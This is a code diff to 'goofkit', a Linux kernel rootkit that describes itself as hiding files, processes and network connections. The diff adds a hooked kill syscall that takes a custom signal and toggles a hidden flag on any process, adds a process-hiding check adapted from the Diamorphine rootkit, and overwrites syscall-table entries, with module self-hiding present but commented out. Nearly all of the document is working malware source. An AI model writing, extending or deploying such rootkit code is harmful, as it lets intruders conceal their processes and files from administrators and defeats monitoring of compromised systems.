@@ -1,13 +1,12 @@
 /*
 Project: goofkit
-Author: Jack "Hulto" McKenna & Rayne Cafaro
+Author: Jack "Hulto" McKenna 🇺🇸  & Rayne Cafaro🤔
 Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
-
-Tasks:
-## Finish process hiding ##
+Task:
+## Comms with rootkti ##
 */
 
-
+#include <linux/sched.h>
 #include <linux/version.h>
 #include <linux/err.h>
 #include <linux/kernel.h>
@@ -48,9 +47,16 @@ Tasks:
 	preempt_enable();
 
 
+//## /Credit ##
+//Declare macros - Should be in header
+//#define KILL_SIG 61
+#define HIDE_SIG 62
+#define HIDDEN 0x10000000
+#define ESC_SIG 63
+
 //Declare vars
 static unsigned long *__sys_call_table;
-
+int is_hidden_proc(pid_t pid);
 unsigned char * create_tramp(unsigned long *dst, unsigned long *src, unsigned int id, unsigned int h_len);
 
 int HOOK_LEN = 15;
@@ -60,7 +66,9 @@ int HOOK_LEN = 15;
 //mov    rax,rax
 //jmp    rax
 unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\xc0\xff\xe0";
+ 
 
+ 
 //Struct for each hook
 struct Hook{
 	unsigned int id;
@@ -105,10 +113,13 @@ struct linux_dirent {
 								  */
 };
 
+typedef int pid_t;
+
 unsigned char *jump;
 struct Hook **hooks;
 
 
+int (*original_kill)(pid_t, int);
 int (*original_getdents)(unsigned int, struct  linux_dirent *, unsigned int);
 int (*original_getdents64)(unsigned int, struct linux_dirent *, unsigned int);
 int (*original_open)(const char *, int, mode_t);
@@ -152,14 +163,6 @@ int goofy_uname(struct utsname *buf){
 	return ret;
 }
 
-int is_hidden_proc(pid_t pid){
-	//Skeleton code
-	if (pid == 1337){
-		return 1;
-	}
-	return 0;
-}
-
 int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
 	//Execute original funciton
 	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
@@ -174,7 +177,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	struct linux_dirent *k_dire = kmalloc(ret, GFP_KERNEL);
 	if(!k_dire){ kfree(k_dire); return -1; }
 	struct linux_dirent *cur_dire;
-	copy_from_user(k_dire, dire, ret);
+	int throw_away_variable_just_ignore_this_garbage_output = copy_from_user(k_dire, dire, ret);
 
 	struct inode *d_inode;
 	int proc = 0;
@@ -210,7 +213,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 		}
 		i += cur_dire->d_reclen;	
 	}
-	copy_to_user(dire, ret_dire, new_len);
+	throw_away_variable_just_ignore_this_garbage_output = copy_to_user(dire, ret_dire, new_len);
 	ret = new_len;
 	
 	kfree(k_dire);
@@ -218,17 +221,53 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	return ret;	
 }
 
-//Check that the hook and trampoline are correct.
-int goofy_accept(int sockfd, struct sockaddr *addr, int *addrlen){
-//	printk("[goof] accept hook\n");
-	//Execute original funciton
-	//Calling the original function to fill out our buf variable.
-	//Any additions need to happen after the inline assembly otherwise
-	//The original function will return strange garbage
-	int (*func_ptr)(int sockfd, struct sockaddr *addr, int *addrlen) = (void *)hooks[2]->trampoline;
-	int ret = func_ptr(sockfd, addr, addrlen);		
 
-	printk("[goof] goofy_accept called\n");
+//### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
+//More efficent than using an expanding array of PIDs
+struct task_struct *find_task(pid_t pid){
+	struct task_struct *tmp = current;
+	//Iterate through each process to find the desired process
+	for_each_process(tmp) {
+		if(tmp->pid == pid){
+			return tmp;
+		}
+	}
+	return NULL;
+}
+//Check if process is hidden👀
+int is_hidden_proc(pid_t pid){
+	//If pid DNE return
+	if(pid == 0){ return 0; }
+	struct task_struct *res;
+	res = find_task(pid);
+	//If res DNE return
+	if(res == 0){ return 0; }
+	//If hidden return 1
+	if(res->flags & HIDDEN){
+		return 1;
+	}
+
+	return 0;
+}
+
+//### END CREDIT ###
+
+int goofy_kill(pid_t pid, int sig){
+	//printk("[goof] goofy_kill\n");
+	/*FAULT - invalid opcode - Relative jump is wreking everything :(
+		waiting for LDE+ to be finished to implement in-line hooking
+		*/
+	//int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
+	//int ret = func_ptr(pid, sig);
+	struct task_struct *res;
+	if(sig == HIDE_SIG){
+		//pid_task(find_vpid(pid), PIDTYPE_PID); --- doesn't work b/c we're not GPL
+		res = find_task(pid);
+		//XOR allows us to hide and unhide the process
+		res->flags ^= HIDDEN;
+		return 0;
+	}
+	int ret = original_kill(pid, sig);
 	return ret;
 }
 
@@ -320,13 +359,13 @@ void remove_tramp(unsigned int id ){
 	ENABLE_W_PROTECTED_MEMORY
 }
 
-int hooks_count = 2;
+int hooks_count = 3;
 
 static int __init
 goof_init(void) {
 	//Hide kernel module from lsmod 
-//	list_del_init(&__this_module.list);
-//	kobject_del(&THIS_MODULE->mkobj.kobj);
+	//list_del_init(&__this_module.list);
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	printk("[goof] module loaded\n");
 
@@ -340,9 +379,27 @@ goof_init(void) {
 	//original_uname = __sys_call_table[__NR_uname];
 	//__sys_call_table[__NR_uname] = goofy_uname;
 
-	//Trampolining way to overwrite syscall
+	//Trampolining way to overwrite syscall  
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
 	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
+	
+	//Waiting on LDE+ to create these into trampoline hooks
+	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
+	original_kill = __sys_call_table[__NR_kill];
+	__sys_call_table[__NR_kill] = goofy_kill;
+
+	//NO - waiting on an LDE @Scott Court
+	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
+	//Creating a new trampoline - DEBUG
+	
+	printk("[goof] DEBUG\n ");
+	unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_kill];
+	for(int i = 0; i < 32; i++){
+		printk("%02x ", ptr_tmp[i]);
+	}
+	printk("\n");
+
+
 	return 0;
 }
 static void __exit
@@ -350,6 +407,12 @@ goof_exit(void) {
 
 	remove_tramp(0);
 	remove_tramp(1);
+
+
+	__sys_call_table[__NR_kill] = original_kill;
+
+
+	//remove_tramp(2);
 	printk("[goof] module removed\n");
 	return;
 }
